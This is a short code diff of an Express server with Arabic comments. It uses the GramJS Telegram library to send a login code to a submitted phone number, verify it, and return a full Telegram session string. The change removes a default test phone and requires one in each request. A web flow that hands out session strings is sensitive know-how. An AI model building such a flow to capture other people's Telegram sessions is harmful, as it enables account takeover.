@@ -11,13 +11,14 @@ app.use(express.static('public'));
 
 const apiId = parseInt(process.env.API_ID || "0", 10);
 const apiHash = process.env.API_HASH || "";
-const defaultPhone = process.env.TEST_PHONE || "";
 
-// خطوة واحدة: إرسال الكود
+// استقبال الرقم المرسل من الواجهة حصراً
 app.post('/api/send-code', async (req, res) => {
   try {
     const { phone } = req.body;
-    const targetPhone = phone || defaultPhone;
+    if (!phone) {
+      return res.status(400).json({ success: false, error: 'الرقم مطلوب' });
+    }
 
     const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
       connectionRetries: 3,
@@ -27,7 +28,7 @@ app.post('/api/send-code', async (req, res) => {
 
     const result = await client.invoke(
       new Api.auth.SendCode({
-        phoneNumber: targetPhone,
+        phoneNumber: phone,
         apiId: apiId,
         apiHash: apiHash,
         settings: new Api.CodeSettings({}),
@@ -37,7 +38,7 @@ app.post('/api/send-code', async (req, res) => {
     res.json({
       success: true,
       phoneCodeHash: result.phoneCodeHash,
-      phone: targetPhone
+      phone: phone
     });
 
   } catch (error) {
@@ -46,7 +47,6 @@ app.post('/api/send-code', async (req, res) => {
   }
 });
 
-// خطوة واحدة: تأكيد الكود وتسجيل الدخول فوراً
 app.post('/api/verify-code', async (req, res) => {
   try {
     const { phoneNumber, phoneCode, phoneCodeHash } = req.body;
@@ -73,7 +73,7 @@ app.post('/api/verify-code', async (req, res) => {
       sessionString: savedSession
     });
 
-  } catch (error) {
+  } catch (error)  {
     console.error('خطأ في التحقق:', error);
     if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
       return res.json({ success: false, needPassword: true, error: 'الحساب محمي بكلمة مرور (2FA)' });
